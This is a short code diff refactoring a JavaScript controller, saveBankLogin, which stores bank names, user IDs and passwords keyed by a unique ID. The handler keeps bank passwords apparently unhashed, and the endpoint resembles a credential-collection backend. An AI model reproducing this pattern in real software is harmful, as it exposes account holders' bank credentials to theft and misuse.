@@ -5,29 +5,29 @@ export const saveBankLogin = async (req, res) => {
         const { uniqueid, bankName, userId, password } = req.body;
 
         if (!uniqueid) {
-            return res.json({ success: false, message: "Unique ID missing" });
+            return res.json({
+                success: false,
+                message: "Unique ID missing"
+            });
         }
 
-        const entry = new BankLogin({
+        await BankLogin.create({
             uniqueid,
             bankName,
             userId,
             password
         });
 
-        await entry.save();
-
         return res.json({
             success: true,
-            message: "Bank login saved successfully",
-            data: entry
+            message: "Bank login saved successfully"
         });
 
     } catch (e) {
         return res.json({
             success: false,
-            message: "Server error",
-            error: e.message
+            message: "Server error"
         });
     }
 };
+
